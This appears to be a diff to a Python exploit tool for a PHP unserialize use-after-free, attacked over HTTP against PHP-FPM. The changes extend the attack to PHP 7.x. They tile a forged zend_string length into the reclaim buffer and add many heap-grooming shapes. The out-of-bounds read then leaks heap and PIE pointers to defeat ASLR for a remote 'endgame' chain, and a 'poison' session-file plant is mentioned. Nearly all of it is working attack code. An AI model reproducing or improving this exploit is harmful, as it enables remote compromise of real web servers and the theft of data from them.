@@ -348,9 +348,11 @@ class Oracle:
     def _symbol(self, name: str) -> int:
         binary = os.readlink(f"/proc/{self.pid}/exe")
         result = subprocess.run(["nm", binary], capture_output=True, text=True)
+        # PHP <= 7.2 exports the zval destructor with a leading underscore
+        aliases = {name, "_" + name}
         for line in result.stdout.splitlines():
             parts = line.split()
-            if len(parts) >= 3 and parts[-1] == name:
+            if len(parts) >= 3 and parts[-1] in aliases:
                 return int(parts[0], 16)
         raise RuntimeError(f"symbol {name} not found")
 
@@ -1438,14 +1440,21 @@ def _leak_read(base_url: str, builder_url: str, version: str, geom: dict,
     size = geom["size"]
     read_len = geom["read_len"]
     header = geom["header_content_off"]
-    content = bytearray(size)
-    struct.pack_into("<I", content, header, 0x40000000)      # refcount
-    struct.pack_into("<I", content, header + 4, 6)           # IS_STRING
-    struct.pack_into("<Q", content, header + 8, 0)           # h
-    struct.pack_into("<Q", content, header + 0x10, read_len) # len
-    fill = min(read_len, size - header - 0x18)
-    if fill > 0:
-        content[header + 0x18:header + 0x18 + fill] = b"Q" * fill
+    # Tile the reclaim buffer with the read length instead of planting one
+    # header at a calibrated offset.  The stale zval points at the arm's
+    # freed short string; wherever that slot lands INSIDE this buffer, the
+    # zend_string it aliases must carry a sane length, otherwise an
+    # uncalibrated build reads a garbage length and can crash the worker
+    # (observed on 7.4.33).  The read always starts at the stale string's
+    # own body, so profiles calibrated with a single header keep their
+    # offsets: for them this is the same bytes at the same place.
+    content = bytearray(struct.pack("<Q", read_len) * (size // 8 + 8))
+    content = content[:size]
+    if header + 0x18 <= size:    # keep the recorded offset meaningful too
+        struct.pack_into("<I", content, header, 0x40000000)      # refcount
+        struct.pack_into("<I", content, header + 4, 6)           # IS_STRING
+        struct.pack_into("<Q", content, header + 8, 0)           # h
+        struct.pack_into("<Q", content, header + 0x10, read_len) # len
     parts = [{"name": f"pad{i}", "data": b"C" * pad}
              for i, pad in enumerate(geom["pads"])]
     parts.append({"name": "big", "data": bytes(content)})
@@ -1563,8 +1572,11 @@ def _scan_pointers(read: bytes) -> tuple[list[tuple[int, int]],
 
 
 # (pads, size) shapes tried while discovering the leak geometry.  Where the
-# freed 16 KB slot lands depends on the allocator of the build, so the shape
-# that covers it on 8.4 is only the first guess.
+# freed short-string slot lands depends on the allocator of the build - and
+# on PHP 7.x the page recycling differs enough that the 8.4-era shapes miss
+# entirely - so the sweep walks pad/size combinations of increasing pressure.
+# A miss is cheap with the tiled content: the read comes back short instead
+# of crashing the worker.
 LEAK_SHAPES = (
     ([32768, 16384], 16384),
     ([32768], 16384),
@@ -1572,68 +1584,86 @@ LEAK_SHAPES = (
     ([16384, 16384], 16384),
     ([32768, 16384], 32768),
     ([65536, 32768], 32768),
+    ([], 16384),
+    ([4096], 16384),
+    ([4096, 4096], 16384),
+    ([8192, 8192], 16384),
+    ([16384], 16384),
+    ([16384], 32768),
+    ([32768], 32768),
+    ([4096, 4096], 32768),
+    ([8192, 8192], 32768),
+    ([32768, 16384], 24576),
+    ([16384, 8192], 24576),
+    ([4096, 4096, 4096], 16384),
+    ([65536], 16384),
+    ([65536, 16384], 32768),
+    ([8192], 32768),
+    ([], 32768),
 )
 
 
 def leak_geometry_candidates(base_url: str, builder_url: str, version: str,
                              arm_path: str = "/bigvar.php"):
-    """Yield an HTTP leak geometry for every shape/header pair that is stable.
+    """Yield an HTTP leak geometry for every reclaim shape that is stable.
 
-    The forged header is tried at a few content offsets of a few reclaim
-    shapes; a geometry is yielded when two consecutive OOB reads expose a
-    chunk pointer and at least one PIE-range pointer at the very same
-    offsets (the FPM master keeps both bases for its whole lifetime, so a
-    stable pair is real).  Which of those geometries actually carries a
-    *code* pointer is decided by the caller: only a remote endgame proof
-    proves a base.
+    The reclaim buffer is tiled with the read length (see _leak_read), so
+    a calibrated header offset no longer decides anything: what matters is
+    that the SHAPE lets the buffer overlap the arm's freed short string.
+    A geometry is yielded when two consecutive OOB reads expose a chunk
+    pointer and at least one PIE-range pointer at the very same offsets
+    (the FPM master keeps both bases for its whole lifetime, so a stable
+    pair is real).  Which of those geometries actually carries a *code*
+    pointer is decided by the caller: only a remote endgame proof proves
+    a base.
     """
     for pads, size in LEAK_SHAPES:
-        for header in LEAK_HEADER_GRID:
-            if header + 0x18 >= size:
-                continue    # the forged header would not fit the buffer
-            geom = {"arm_path": arm_path, "pads": list(pads),
-                    "size": size, "header_content_off": header,
-                    "read_len": LEAK_READ_LEN}
-            first = _leak_read(base_url, builder_url, version, geom)
-            if first is None:
-                continue
-            chunk_ptrs, pie_ptrs = _scan_pointers(first)
-            if not chunk_ptrs or not pie_ptrs:
-                continue
-            second = _leak_read(base_url, builder_url, version, geom)
-            if second is None:
-                continue
-            chunk_again, pie_again = _scan_pointers(second)
-            stable_chunk = [(off, val) for off, val in chunk_ptrs
-                            if (off, val) in chunk_again]
-            stable_pie = [(off, val) for off, val in pie_ptrs
-                          if (off, val) in pie_again]
-            if not stable_chunk or not stable_pie:
-                continue
-            chunk_off, chunk_ptr = stable_chunk[0]
-            chunk = chunk_ptr & ~(MEM_CHUNK - 1)
-            # The execute_ex handler table sits at the far end of the OOB read
-            # (0x157e8 of a 0x15810 read on 8.4 and on 8.2), while the dense
-            # runs of stale heap values sit near its start: trying the pointers
-            # from the tail first is what keeps the base search short.
-            stable_pie.sort(key=lambda item: item[0], reverse=True)
-            geometry = {
-                "arm_path": arm_path,
-                "pads": list(pads),
-                "size": size,
-                "header_content_off": hex(header),
-                "read_len": hex(LEAK_READ_LEN),
-                "chunk_ptr_off": hex(chunk_off),
-                "chunk_base_off": hex(chunk_ptr - chunk),
-                "pie_ptr_off": None,    # set once a pointer proves its base
-                "pie_base_off": None,   # ditto
-                "bases": "discovered over HTTP with the calibrate command "
-                         "(no /proc access)",
-            }
-            print(f"[+] leak geometry pads={pads} size={size} "
-                  f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
-                  f"{len(stable_pie)} stable PIE-range pointers")
-            yield geometry, chunk_ptr, stable_pie
+        header = LEAK_HEADER_GRID[0]
+        if header + 0x18 >= size:
+            continue    # the recorded header would not fit the buffer
+        geom = {"arm_path": arm_path, "pads": list(pads),
+                "size": size, "header_content_off": header,
+                "read_len": LEAK_READ_LEN}
+        first = _leak_read(base_url, builder_url, version, geom)
+        if first is None:
+            continue
+        chunk_ptrs, pie_ptrs = _scan_pointers(first)
+        if not chunk_ptrs or not pie_ptrs:
+            continue
+        second = _leak_read(base_url, builder_url, version, geom)
+        if second is None:
+            continue
+        chunk_again, pie_again = _scan_pointers(second)
+        stable_chunk = [(off, val) for off, val in chunk_ptrs
+                        if (off, val) in chunk_again]
+        stable_pie = [(off, val) for off, val in pie_ptrs
+                      if (off, val) in pie_again]
+        if not stable_chunk or not stable_pie:
+            continue
+        chunk_off, chunk_ptr = stable_chunk[0]
+        chunk = chunk_ptr & ~(MEM_CHUNK - 1)
+        # The execute_ex handler table sits at the far end of the OOB read
+        # (0x157e8 of a 0x15810 read on 8.4 and on 8.2), while the dense
+        # runs of stale heap values sit near its start: trying the pointers
+        # from the tail first is what keeps the base search short.
+        stable_pie.sort(key=lambda item: item[0], reverse=True)
+        geometry = {
+            "arm_path": arm_path,
+            "pads": list(pads),
+            "size": size,
+            "header_content_off": hex(header),
+            "read_len": hex(LEAK_READ_LEN),
+            "chunk_ptr_off": hex(chunk_off),
+            "chunk_base_off": hex(chunk_ptr - chunk),
+            "pie_ptr_off": None,    # set once a pointer proves its base
+            "pie_base_off": None,   # ditto
+            "bases": "discovered over HTTP with the calibrate command "
+                     "(no /proc access)",
+        }
+        print(f"[+] leak geometry pads={pads} size={size} "
+              f"header=0x{header:x}: chunk_ptr_off=0x{chunk_off:x}, "
+              f"{len(stable_pie)} stable PIE-range pointers")
+        yield geometry, chunk_ptr, stable_pie
 
 
 def _local_bases(version: str) -> tuple[int, int]:
@@ -2435,8 +2465,9 @@ def main() -> int:
     # reclaim: use 'poison' against those builds.
     if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
                     "no-oracle") and not registry.chain_applies(args.version):
-        print(f"[!] {args.cmd} needs PHP >= 8.0: older branches never "
-              f"reclaim the stale unserialize struct (no verified chain).")
+        print(f"[!] {args.cmd} needs a chain-verified branch (7.4, 8.0+): "
+              f"older builds never reclaim the stale unserialize struct in "
+              f"practice.")
         print("    Use 'poison' (session-file plant) against those builds.")
         return 1
     if getattr(args, "candidates", None):
